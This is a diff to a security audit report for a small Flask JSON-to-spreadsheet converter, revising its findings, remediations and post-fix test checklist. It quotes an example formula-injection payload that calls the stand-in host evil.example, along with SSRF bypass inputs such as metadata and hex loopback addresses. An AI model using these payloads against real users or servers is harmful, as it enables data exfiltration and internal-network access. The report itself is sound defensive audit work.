@@ -11,13 +11,13 @@
 
 The application has a strong security posture for its size: mandatory CSRF, SSRF pre-validation with `allow_redirects=False`, strict CSP with no inline scripts, consistent `escapeHtml()` on all dynamic frontend rendering, generic error messages, and deliberate no-storage/no-payload-logging. Those fundamentals are solid and must be preserved.
 
-However, the audit found **1 Critical, 3 High, and 7 Medium** issues that should be addressed in the next version. The most serious is **CSV/Excel formula injection (CWE-1236)** — the core feature of this tool (converting untrusted API/file JSON into spreadsheet files) actively enables it. The second most urgent is the **unpatched dependency set** (`gunicorn 21.2.0` carries a High-severity HTTP request-smuggling CVE). Several smaller issues (credential leakage in error logs, user-controlled outbound header names, missing hardening headers, DNS-lookup DoS, no SECRET_KEY fail-fast) are cheap to fix.
+However, the audit found **1 Critical, 2 High, and 8 Medium** issues that should be addressed in the next version. The most serious is **CSV/Excel formula injection (CWE-1236)** — the core feature of this tool (converting untrusted API/file JSON into spreadsheet files) actively enables it. The second most urgent is the **unpatched dependency set** (`gunicorn 21.2.0` carries a High-severity HTTP request-smuggling CVE). Several smaller issues (credential leakage in error logs, user-controlled outbound header names, missing hardening headers, DNS-lookup DoS, no SECRET_KEY fail-fast) are cheap to fix.
 
 | Severity | Count | Items |
 |---|---|---|
 | Critical | 1 | F1 CSV/Excel formula injection |
-| High | 3 | F2 Dependency CVEs (gunicorn smuggling), F6 SSRF worker starvation (DNS, no timeout), F12 Rate limiting ineffective behind proxy |
-| Medium | 7 | F3 Credential leak in error logs, F4 User-controlled outbound header name, F5 Security-header gaps + no HSTS, F7 Default SECRET_KEY no fail-fast, F8 Recursion-depth DoS, F9 API JSONL → 500 + response snippet in logs, F11 Missing no-store cache control |
+| High | 2 | F2 Dependency CVEs (gunicorn smuggling), F12 Rate limiting ineffective behind proxy |
+| Medium | 8 | F3 Credential leak in error logs, F4 User-controlled outbound header name, F5 Security-header gaps + no HSTS, F6 SSRF gaps (slow DNS, open ports, residual rebinding), F7 Default SECRET_KEY no fail-fast, F8 Recursion-depth DoS, F9 API JSONL → 500 + log leakage, F11 Missing no-store cache control |
 | Low | 5 | F10 413 handled by HTML, F13 Upload validation, F14 Credentials over plain HTTP (deploy guidance), F15 `/health` version disclosure, F16 JWT/CSRF session cookie flags |
 | Info | 1 | F17 Documentation drift (MIT vs GPL, stale candidates handshake) |
 
@@ -38,11 +38,16 @@ For XLSX this is confirmed behavior of `openpyxl` (3.1.2): a string value starti
 
 **Exploitation:** User (or automated pipeline) converts `[{"name": "=HYPERLINK(\"https://evil.example/\",\"click\")"}]` and exports CSV or XLSX; opening the file in Excel triggers the formula → credential/CSV exfiltration or malware download. The XLSX path is worse because Excel formulas run without the "formula in CSV" warning.
 
-**Remediation:** Sanitize all cell values before serialization in all four export paths (server CSV, server XLSX, client CSV, client TSV): if the value starts with `=`, `+`, `-`, `@` (or tab/CR), prefix it with a single quote `'` (Excel's string-escape) — or refuse/blank it. Centralize in one helper on each side:
-- Backend: `sanitize_cell(value)` in `helpers.py`, used by both `export_csv` and `export_xlsx` (replaces the duplicated `isinstance(v, (dict, list))` branches — see roadmap refactor).
-- Frontend: sanitize inside `downloadDelimited()`'s `escape()` and in the `formatValue()` path only for exports (preview can keep rendering raw text, but display-only).
+**Remediation (format-specific):** Sanitize cell values in the spreadsheet-compatible export paths (server CSV, server XLSX, client CSV, client TSV). If a value begins with `=`, `+`, `-`, `@`, tab, CR, or LF (all are formula triggers per OWASP), force it to be treated as text. Choose one *tested* policy per format — OWASP warns that naive single-quote prefixing can be stripped when Excel saves and reopens the file, so verify the round-trip:
+- **CSV/TSV (server + client):** prefix dangerous values with a single quote `'` (or a leading tab) and add an acceptance test that opens the file after an Excel save/reopen round-trip.
+- **XLSX:** write dangerous strings explicitly as string cells (do not let openpyxl infer a formula); assert the cell's `data_type` is `'s'`.
+- **JSONL / Markdown exports (roadmap 4.3) must NOT be formula-sanitized:** JSONL stays lossless; Markdown uses Markdown-specific escaping.
 
-**Effort:** 1-2h. **Tests:** extend `tests/test_routes.py` with `=SUM(A1)`, `@cmd`, `+`, `-` values for both export routes; add a JS-adjacent assertion path if feasible.
+Centralize in one helper on each side:
+- Backend: `sanitize_cell(value)` in `helpers.py`, used by both `export_csv` and `export_xlsx` (replaces the duplicated `isinstance(v, (dict, list))` branches — see roadmap refactor).
+- Frontend: sanitize inside `downloadDelimited()`'s `escape()`. The preview may render raw text, but every export path must sanitize.
+
+**Effort:** 1-2h. **Tests (automated, all four export paths):** extend `tests/test_routes.py` with `=SUM(A1)`, `@cmd`, `+1`, `-1`, and tab-/CR-/LF-prefixed values for both `export_csv` and `export_xlsx`, asserting the generated output; for the client paths, extract the sanitizer into a pure function in `app.js` and exercise `downloadDelimited()` with both delimiters (`','` and `'\t'`) via a Node-based assertion script (or a documented browser manual check if Node is not available in CI). Two export paths must not be able to regress while the checklist still passes.
 
 ---
 
@@ -70,6 +75,8 @@ For XLSX this is confirmed behavior of `openpyxl` (3.1.2): a string value starti
 
 **Effort:** 30-60m + full test pass. **Risk:** Flask 3.1 deprecates nothing used here; verify `WTF_CSRF_ENABLED` and limiter behavior in tests.
 
+**Reachability note:** CVE-2026-25645 (requests, GHSA-gc5v-m9x4-r6x2) affects only `requests.utils.extract_zipped_paths()`, which this app never calls — the upstream advisory states standard `requests` usage is unaffected. It is counted here as package/supply-chain hygiene, not a reachable runtime risk. All fix versions in the table are *minimum* patched versions; re-run `pip-audit` at implementation time in case newer pins are preferred.
+
 ---
 
 ### F3 — Credential leakage into server logs (query-param auth) — **Medium**
@@ -78,14 +85,16 @@ For XLSX this is confirmed behavior of `openpyxl` (3.1.2): a string value starti
 
 **Description:** When the connection fails, `requests` exception messages include the **full URL including query string**. With `auth_method == 'query_param'` (routes.py:105-109) the token rides in the URL, so `logger.warning(...)` writes the secret into stdout logs — a direct violation of the "no payload logging / no credential logging" stance. Example message: `HTTPConnectionPool(host='api.example.com', port=443): Max retries exceeded with url: /data?api_key=SECRET ...`.
 
-**Remediation:** Log a sanitized representation only:
+**Remediation:** Log a fixed message with no user-controlled data:
+
 ```python
 except requests.exceptions.RequestException:
-    logger.warning('API request failed for %s', redact_url(api_url))
+    logger.warning('API request failed')
 ```
-Add `redact_url()` (strip query + fragment + userinfo) to `security.py` or `helpers.py`. Keep the generic user-facing `'API request failed'` response.
 
-**Effort:** 30m. **Tests:** unit-test `redact_url`; extend `TestApiFetch` to assert the log message (via `caplog`) does not contain the token.
+Do not log the URL at all — query strings, fragments, userinfo, *and paths* can all carry tokens, so a redaction helper that preserves the path is not sufficient. Keep the generic user-facing `'API request failed'` response.
+
+**Effort:** 30m. **Tests:** via `caplog`, fail an API fetch with the token in the query string *and* in the path; assert no URL component or token appears in any log record.
 
 ---
 
@@ -118,14 +127,16 @@ Add `redact_url()` (strip query + fragment + userinfo) to `security.py` or `help
 Also consider `upgrade-insecure-requests` in CSP for HTTPS-only deploys.
 
 **Remediation:**
+
 ```python
 response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'  # only when request.is_secure / X-Forwarded-Proto=https
 response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()'
 response.headers['Cross-Origin-Opener-Policy'] = 'same-origin'
 response.headers['Cross-Origin-Resource-Policy'] = 'same-origin'
-CSP += "object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'"
+CSP += "; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'"  # note the leading '; ' separator
 ```
-`X-Frame-Options: DENY` stays as legacy fallback. Guard HSTS behind `is_secure` (or a `FORCE_HTTPS` config) so local `http://localhost` dev is unaffected.
+
+Build the CSP as a list of directives (or keep the trailing `;` in the base string) so appending can never concatenate tokens into a malformed directive. `X-Frame-Options: DENY` stays as legacy fallback. Guard HSTS behind `is_secure` (or a `FORCE_HTTPS` config) so local `http://localhost` dev is unaffected.
 
 **Effort:** 1h. **Tests:** extend `TestSecurityHeaders` to assert each new header; ensure CSP still allows Google Fonts and `data:` images.
 
@@ -144,7 +155,7 @@ CSP += "object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 
 **What I verified as solid (do not regress):** decimal/hex IP forms (`2130706433`, `0x7f000001`) resolve via `getaddrinfo` to `127.0.0.1` and are rejected; IPv4-mapped IPv6 (`[::ffff:7f00:1]`) has `is_global=False` and is rejected; userinfo tricks (`http://evil@127.0.0.1`) yield hostname `127.0.0.1` and are rejected; `nip.io`-style wildcard domains resolve to real IPs and are checked; `allow_redirects=False` + `raise_for_status()` means 3xx responses never re-connect.
 
 **Remediation (item 1, High-ish priority):**
-- Resolve DNS in a bounded way: run `getaddrinfo` in a `ThreadPoolExecutor` with `API_DNS_TIMEOUT` (default ~3s), or use a resolver with an explicit timeout (`socket.setdefaulttimeout` does not reliably cover `getaddrinfo`).
+- Resolve DNS in a bounded way: run `getaddrinfo` in a **shared, module-level** `ThreadPoolExecutor` (fixed `max_workers`, e.g. 4) with an in-flight semaphore, and wait with `future.result(timeout=API_DNS_TIMEOUT)` (default ~3s). Do **not** create a per-request executor: `Future.result(timeout=...)` only bounds the caller's wait and cannot cancel a running `getaddrinfo`, so per-request executors leak blocked threads and a shared unbounded pool can saturate. A *hard* execution bound requires process isolation or a cancellable resolver — document the timeout as a wait bound and gate concurrency explicitly.
 - Add `API_ALLOWED_PORTS` (default `80,443,8443`) — cheap and kills most non-HTTP abuse.
 - Keep the residual-rebinding comment; document the port decision in `MEMORY.md`.
 
@@ -162,7 +173,7 @@ CSP += "object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 
 - In `create_app()`, after config load: if `DEBUG` is False and `SECRET_KEY` equals the dev default (or is `None`/empty), `raise RuntimeError('SECRET_KEY must be set in production')`.
 - Also validate that config integers are actually integers (env typo like `MAX_UPLOAD_SIZE=abc` currently raises `ValueError` at import time with a confusing traceback; wrap with clear messages).
 
-**Effort:** 30m. **Tests:** `create_app` raises when `Config(SECRET_KEY='dev-secret-key-change-in-production')` + `DEBUG=False`; no regression for the test fixture (tests run with `TESTING=True` — bypass check when `TESTING`).
+**Effort:** 30m. **Tests:** with `FLASK_DEBUG=0` and `SECRET_KEY` unset (so the dev default applies), call `create_app()` through the real factory and assert `RuntimeError`; set a valid `SECRET_KEY` (or keep the `TESTING=True` fixture bypass) and assert startup succeeds. Do not construct `Config(SECRET_KEY=...)` — `Config` is a class with class attributes, not a constructor; drive behavior via environment variables or `app.config` mutation after load.
 
 ---
 
@@ -170,10 +181,10 @@ CSP += "object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 
 
 **Location:** `helpers.py:34-62` (`extract_table_data` recurses at lines 54-58), `helpers.py:82-111` (`find_candidate_arrays` recurses at line 109).
 
-**Description:** `flatten_for_csv` has a `max_depth` guard, but the other two recursive helpers do not. A 10 MB JSON payload nested ~1000+ levels deep (valid JSON) will hit Python's recursion limit inside `extract_table_data`/`find_candidate_arrays` → `RecursionError` → 500 (or worse, in older interpreters, C-stack issues). The server also has no JSON-parse depth control.
+**Description:** `flatten_for_csv` has a `max_depth` guard, but `extract_table_data` (recurses at lines 54-58) does not; `find_candidate_arrays` (recurses at line 109) is dead code slated for removal in roadmap Phase 0. A 10 MB JSON payload nested ~1000+ levels deep (valid JSON) will hit Python's recursion limit inside `extract_table_data` → `RecursionError` → 500 (or worse, in older interpreters, C-stack issues). The server also has no JSON-parse depth control.
 
 **Remediation:**
-- Add `_depth=0, max_depth=...` guards to `extract_table_data` and `find_candidate_arrays` mirroring `flatten_for_csv`'s pattern (deep remainder → JSON-stringify or bail to a single row).
+- Add `_depth=0, max_depth=...` guards to `extract_table_data` mirroring `flatten_for_csv`'s pattern (deep remainder → JSON-stringify or bail to a single row). No guards are needed for `find_candidate_arrays` — it is deleted in roadmap Phase 0.
 - Defensively wrap `json.loads`/`parse_jsonl` calls: catch `RecursionError` and return a 400 (`'JSON nesting too deep'`).
 - Note: CPython's `json` C parser can itself raise `RecursionError` on pathological nesting — that is caught by the same wrapper.
 
@@ -181,15 +192,15 @@ CSP += "object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 
 
 ---
 
-### F9 — API JSONL parse failure returns 500 and logs a response snippet — **Medium / Low**
+### F9 — API JSONL parse failure returns 500 and logs exception details — **Medium**
 
 **Location:** `routes.py:139-151` (API branch) + `routes.py:197-199` (outer handler).
 
-**Description:** In the API branch, `parse_jsonl(text)` raises `ValueError` (with a message containing the *offending line of the API response*), but only `Timeout`, `RequestException`, and `JSONDecodeError` are caught. The `ValueError` propagates to the outer `except Exception` → returns `500 'An internal error occurred'` (wrong status: client error → should be 400) **and** `logger.exception` writes the `ValueError` message — which includes a snippet of the API response — into server logs. Same class of leak as F3.
+**Description:** In the API branch, `parse_jsonl(text)` raises `ValueError` when a line is malformed, but only `Timeout`, `RequestException`, and `JSONDecodeError` are caught. The `ValueError` therefore propagates to the outer `except Exception` → returns `500 'An internal error occurred'` (wrong status: client error → should be 400) and records an unnecessary exception traceback. Note: `str(JSONDecodeError)` contains only the parser diagnostic and line/column offsets — **not** the document text — so no payload snippet reaches the logs via this path (the `.doc` attribute is not formatted by the traceback).
 
-**Remediation:** In the API branch, add `except ValueError: return jsonify({'error': 'API response is not valid JSONL'}), 400` (before the generic handler), and never let `parse_jsonl` messages reach `logger.exception` for the API path. For file/paste the `ValueError` path is already handled with 400 (`routes.py:62-63, 74-75`) and is the user's own data — acceptable to keep verbatim.
+**Remediation:** In the API branch, add `except ValueError: return jsonify({'error': 'API response is not valid JSONL'}), 400` (before the generic handler) so the client gets a 400 and the exception is neither logged nor returned. For file/paste the `ValueError` path is already handled with 400 (`routes.py:62-63, 74-75`) and is the user's own data — acceptable to keep verbatim.
 
-**Effort:** 30m. **Tests:** mock API returning malformed JSONL → assert 400 and (via `caplog`) that no response snippet is logged (this is the known-uncovered branch from `docs/code-health-final.md` §4.2).
+**Effort:** 30m. **Tests:** mock API returning malformed JSONL → assert 400 with the generic message and, via `caplog`, that the ValueError is not logged (this is the known-uncovered branch from `docs/code-health-final.md` §4.2).
 
 ---
 
@@ -262,7 +273,7 @@ CSP += "object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 
 
 **Description:** Version string aids attackers in targeting known CVEs. Common tradeoff for ops tooling.
 
-**Remediation:** Keep the endpoint but make version disclosure configurable (`HEALTH_REVEAL_VERSION=1` default off, or include it only when an `X-Health-Token` matches). Not urgent; log the decision in `MEMORY.md`.
+**Remediation:** Keep the current behavior — `/health` always returns `version` (the existing `tests/test_routes.py` assertion and the `AGENTS.md`/`CLAUDE.md` contract depend on it). Optionally gate disclosure behind `HEALTH_REVEAL_VERSION` with a **default of on** (i.e. no behavior change) so operators may opt out. Not urgent; log the decision in `MEMORY.md`.
 
 ---
 
@@ -270,7 +281,7 @@ CSP += "object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 
 
 **Location:** `config.py` (no `SESSION_COOKIE_*`), `render.yaml`.
 
-**Description:** Flask's default session cookie lacks explicit `HttpOnly`/`SameSite`/`Secure` configuration (defaults: `HttpOnly` yes, `SameSite=None` in recent Flask, `Secure` only when `is_secure` — i.e. misdetected behind the proxy without ProxyFix). Given no server-side sessions are used, the CSRF token is the real secret — still worth locking down.
+**Description:** Flask 3.x cookie defaults are `HttpOnly=True`, `SameSite=None` (no `SameSite` attribute emitted; browsers then apply `Lax`), and `Secure=False`. `Secure` is **not** auto-enabled by `request.is_secure` — it must be set explicitly, and correct detection behind a TLS-terminating proxy requires ProxyFix (F12). Given no server-side sessions are used, the CSRF token is the real secret — still worth locking down.
 
 **Remediation:** Set explicitly: `SESSION_COOKIE_HTTPONLY = True`, `SESSION_COOKIE_SAMESITE = 'Lax'`, `SESSION_COOKIE_SECURE = not DEBUG` (coupled with ProxyFix from F12 so `is_secure` is correct). Optionally `WTF_CSRF_SSL_STRICT`.
 
@@ -296,17 +307,17 @@ CSP += "object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 
 | F2 | 7 dependency CVEs (gunicorn smuggling High) | High | Pin upgrades + dev-deps split + re-audit | 1h |
 | F12 | Rate limit shared-bucket behind proxy | High | ProxyFix opt-in + key_func | 1h |
 | F6 | DNS lookup no timeout / ports unrestricted | Medium | Bounded resolver + port allowlist | 1-2h |
-| F3 | Query-param token in error logs | Medium | `redact_url()` + generic log | 30m |
+| F3 | Query-param token in error logs | Medium | Fixed log message (no URL) | 30m |
 | F4 | User-controlled outbound header name | Medium | Header-name allowlist/regex | 30m |
 | F5 | Missing hardening headers / HSTS | Medium | Extend `apply_security_headers` | 1h |
 | F7 | Dev SECRET_KEY accepted in prod | Medium | Startup fail-fast + config validation | 30m |
 | F8 | Recursion-depth DoS in helpers | Medium | Depth guards + RecursionError → 400 | 1h |
-| F9 | API JSONL ValueError → 500 + log snippet | Medium | Catch ValueError in API branch | 30m |
+| F9 | API JSONL ValueError → 500 (should be 400) | Medium | Catch ValueError in API branch | 30m |
 | F11 | No `Cache-Control: no-store` on data | Low | Headers on data routes | 20m |
 | F10 | 413 returns HTML | Low | JSON error handlers | 20m |
 | F13 | Upload extension/type unchecked | Low | Filename/content-type checks | 30m |
 | F14 | Plain-HTTP credential exposure | Low | Docs + CSP upgrade-insecure-requests | 30m |
-| F15 | `/health` version disclosure | Low | Config-gated version | 30m |
+| F15 | `/health` version disclosure | Low | Keep by default; optional gate (default on) | 30m |
 | F16 | Session cookie flags | Low | Explicit cookie config | 20m |
 | F17 | Docs drift (license, handshake) | Info | Doc sync in roadmap Phase 5 | 1h |
 
@@ -314,14 +325,22 @@ CSP += "object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 
 
 ## 4. Verification Checklist (post-fix)
 
-- [ ] Export CSV, TSV, XLSX with values `=SUM(A1)`, `@cmd`, `+1`, `-1`, `'`, tab, CR — open result in a spreadsheet and confirm **no formula executes** (values render as text).
-- [ ] `pip-audit -r requirements.txt` → 0 vulnerabilities; full `pytest` suite green.
-- [ ] SSRF: `http://127.0.0.1`, `http://169.254.169.254`, `http://2130706433`, `http://[::ffff:7f00:1]`, `http://0x7f000001` all → 400.
-- [ ] Slow-DNS hostname (mock) does not block a worker beyond the configured DNS timeout.
-- [ ] A POST without CSRF token → 400; with forged SECRET_KEY default in prod mode → app refuses to start.
-- [ ] `logger.warning` output contains no URL query strings, tokens, or API-response snippets (`caplog`-based tests).
-- [ ] Response headers: HSTS (secure requests), `Permissions-Policy`, `COOP`, `CRP`, extended CSP (`object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'`).
-- [ ] Data routes send `Cache-Control: no-store`.
-- [ ] >10 MB POST → JSON 413; 1500-deep JSON → 400 not 500.
-- [ ] API-fetch of malformed JSONL → 400 with generic message.
-- [ ] With `TRUST_PROXY=1`, rate-limit buckets are per-client-IP.
+- [ ] **F1** Export CSV, TSV, XLSX with values `=SUM(A1)`, `@cmd`, `+1`, `-1`, tab-, CR-, and LF-prefixed — open the result in a spreadsheet (including after an Excel save/reopen for CSV) and confirm **no formula executes** (values render as text).
+- [ ] **F2** `pip-audit -r requirements.txt` → 0 vulnerabilities; full `pytest` suite green.
+- [ ] **F3** Via `caplog`, a failing API fetch with the token in the query string *and* in the path produces log records containing no URL component or token.
+- [ ] **F4** `api_key_header` set to `Host` / `Content-Length` / `Transfer-Encoding` → 400; the outbound request carries no reserved/hop-by-hop header.
+- [ ] **F6 (IPs)** SSRF: `http://127.0.0.1`, `http://169.254.169.254`, `http://2130706433`, `http://[::ffff:7f00:1]`, `http://0x7f000001` all → 400.
+- [ ] **F6 (DNS)** Slow-DNS hostname (mock) does not block a worker beyond the configured DNS timeout; concurrent lookups respect the in-flight limit.
+- [ ] **F6 (ports)** API fetch to `http://public.example.com:22` / `:6379` → 400 (port allowlist `80,443,8443`).
+- [ ] **F7** A POST without CSRF token → 400; with the dev SECRET_KEY default and `DEBUG=False`, `create_app()` refuses to start.
+- [ ] **F8** 1500-deep JSON → 400 (`'JSON nesting too deep'`), not 500.
+- [ ] **F9** API-fetch of malformed JSONL → 400 with generic message; the ValueError is not logged (`caplog`).
+- [ ] **F10** >10 MB POST → JSON 413 (not HTML).
+- [ ] **F11** Data routes (`/process`, `/export-csv`, `/export-xlsx`, `/health`) send `Cache-Control: no-store`.
+- [ ] **F12** With `TRUST_PROXY=1`, rate-limit buckets are per-client-IP and forged `X-Forwarded-For` headers are ignored.
+- [ ] **F13** Upload `evil.txt` or a non-JSON content-type → 400.
+- [ ] **F14** Deployment docs state HTTPS is required on every path; CSP includes `upgrade-insecure-requests` (manual sign-off).
+- [ ] **F15** `/health` still returns `version` by default; `HEALTH_REVEAL_VERSION=0` hides it (config test).
+- [ ] **F16** Session cookie flags: `HttpOnly`, `SameSite=Lax`, `Secure` in non-debug (assert `Set-Cookie`).
+- [ ] **F17** Docs scan: no stale `candidates`/MIT references in `MEMORY.md`/`CLAUDE.md`/`AGENTS.md`/`README.md` (manual sign-off).
+- [ ] **F5** Response headers: HSTS (secure requests), `Permissions-Policy`, `COOP`, `CRP`, extended CSP (`object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'`).
